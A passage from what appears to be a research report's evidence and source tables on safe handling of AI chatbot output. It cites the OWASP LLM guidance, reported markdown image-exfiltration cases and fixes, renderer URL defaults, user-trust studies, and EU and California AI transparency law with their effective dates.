| OWASP LLM05:2025 improper output handling; zero-trust and CSP | text | [OWASP LLM05](https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/) | 2025 (no exact date) | authority |
| Bing Chat image exfiltration reported / fixed | 2023-04-08 / 2023-06-15 | [Embrace The Red](https://embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/) | 2023-06-18 | researcher blog |
| Later vendor cases (Mistral, GitLab Duo, M365 Copilot, Agentforce, Superhuman, Antigravity, Cowork) | see table in Finding 3 | [Willison tag](https://simonwillison.net/tags/markdown-exfiltration/) | entries 2024-10 to 2026-05 | independent aggregator |
| react-markdown default `urlTransform` schemes | http, https, irc, ircs, mailto, xmpp, relative | [README](https://github.com/remarkjs/react-markdown) | v10, read 2026-11-27 | project docs |
| EU AI Act Art. 50(1)-(5) text | see Finding 7 | [Art. 50](https://artificialintelligenceact.eu/article/50/) | read 2026-11-27 | reproduction of the regulation |
| Art. 50 applied from | 2026-08-02 | [Morgan Lewis](https://www.morganlewis.com/ru/blogs/sourcingatmorganlewis/2026/08/eu-ai-acts-transparency-rules-what-went-into-effect-on-2-august), [Goodwin](https://www.goodwinlaw.com/en/insights/publications/2026/08/alerts-technology-dpc-eu-ai-act-transparency-obligations-now-in-force) | 2026-08 | law-firm summaries |
| Marking duty grace for legacy generative systems | until 2026-12-02 | same | 2026-08 | law-firm summaries |
| Regulation (EU) 2026/1744 in force | 2026-07-27 | [Goodwin](https://www.goodwinlaw.com/en/insights/publications/2026/08/alerts-technology-dpc-eu-ai-act-transparency-obligations-now-in-force) | 2026-08 | law-firm summary |
| California SB 243 signed; duties (notice, 3-hour minor break reminders) | signed 2025-10-13; effective 2026-01-01 UNVERIFIED | [Skadden, 2025-10-17](https://skadden.com/insights/publications/2025/10/new-california-companion-chatbot-law); [FPF, 2025-11-04](https://fpf.org/blog/understanding-the-new-wave-of-chatbot-legislation-california-sb-243-and-beyond/) | 2025-10-17; 2025-11-04 | law-firm summaries; statute HTTP 403; damages amount disputed (\$1,000 floor vs greater-of), unconfirmed |
| California AI Transparency Act operative | 2026-08-02; platforms 2027-01-01; capture devices 2028-01-01 | [MoFo](https://www.mofo.com/resources/insights/261001-california-revamps-ai-transparency-requirements) | 2026-10-01 | law-firm summary |
| SB 1000 enacted, effective immediately | 2026-09-30 | MoFo | 2026-10-01 | law-firm summary |

## Sources

| URL | What it is | Date/era | Why worth reading |
|---|---|---|---|
| https://genai.owasp.org/llmrisk/llm01-prompt-injection/ | OWASP LLM01:2025 prompt injection (primary) | 2025 | segregate external content; exfiltration scenario |
| https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/ | OWASP LLM05:2025 improper output handling (primary) | 2025 | zero-trust output, encode per context, CSP |
| https://arxiv.org/abs/2304.09848 | Liu et al., Evaluating Verifiability in Generative Search Engines (primary study) | 2023-04 / v2 2023-10 | citation recall 51.5%, precision 74.5% |
| https://arxiv.org/abs/2006.14779 | Bansal et al., Does the Whole Exceed its Parts? (primary study) | 2020-06 / CHI 2021 | explanations raise acceptance regardless of correctness |
| https://arxiv.org/pdf/2006.14779 | same paper, full text | 2021-01 | team accuracy numbers, p-values |
| https://arxiv.org/abs/2405.00623 | Kim et al., "I'm Not Sure, But..." (primary study) | 2024-05 | uncertainty wording effect |
| https://arxiv.org/pdf/2405.00623 | same paper, full text | 2024-05 | Table 1 numbers |
| https://pair.withgoogle.com/chapter/explainability-trust/ | Google PAIR guidebook chapter (primary guidance) | undated | confidence display and explanation stance |
| https://artificialintelligenceact.eu/article/50/ | EU AI Act Art. 50 text (primary reproduction) | read 2026-11-27 | the transparency duties |
| https://www.morganlewis.com/ru/blogs/sourcingatmorganlewis/2026/08/eu-ai-acts-transparency-rules-what-went-into-effect-on-2-august | Law-firm summary | 2026-08 | what applied on 2 August; marking deferral |
| https://www.goodwinlaw.com/en/insights/publications/2026/08/alerts-technology-dpc-eu-ai-act-transparency-obligations-now-in-force | Law-firm summary | 2026-08 | Omnibus 2026/1744 dates |
| https://www.mofo.com/resources/insights/261001-california-revamps-ai-transparency-requirements | Law-firm summary of SB 1000 | 2026-10-01 | California latent-disclosure changes |
| https://simonwillison.net/tags/markdown-exfiltration/ | Aggregated vendor cases and fixes | 2024-10 to 2026-05 | which products shipped the bug and how fixed |
| https://embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/ | Researcher disclosure of the Bing Chat case | 2023-06-18 | original mechanism and timeline |
| https://github.com/remarkjs/react-markdown | react-markdown v10 README (primary) | read 2026-11-27 | safe-by-default scope; urlTransform |
| https://marked.js.org/ | marked docs (primary) | read 2026-11-27 | "does not sanitize" warning |
| https://github.com/markdown-it/markdown-it | markdown-it README (primary) | read 2026-11-27 | "Safe by default"; defaults not stated |
| https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/img-src | MDN CSP img-src (primary) | read 2026-11-27 | the enforcement header |
| Local: `~/.cache/research-lang/exemplars/product/mdtest/t.mjs`, `f.mjs`, `out.txt` | the renderer measurement and fix test | 2026-11-27 | re-runnable evidence |

Fetch failures and gaps: `leginfo.legislature.ca.gov` and `legiscan.com` returned HTTP 403, so SB 243's text is secondary-sourced; the EU Official Journal text of Regulation 2026/1744 was not fetched; the markdown-it page did not state option defaults (measured instead); `react-markdown` + `rehype-sanitize` and streaming behaviour were not measured. PDFs were parsed locally with `pdf-parse@1.1.1` because the fetch tool could not read them. The central question was sourced, so this is not blocked.

Cross-territory (one line each, not pursued): accessible announcement of streaming output belongs to UX accessibility; approval before agent actions belongs to UX-ACT; prompt wrapping and tool permissions belong to security.
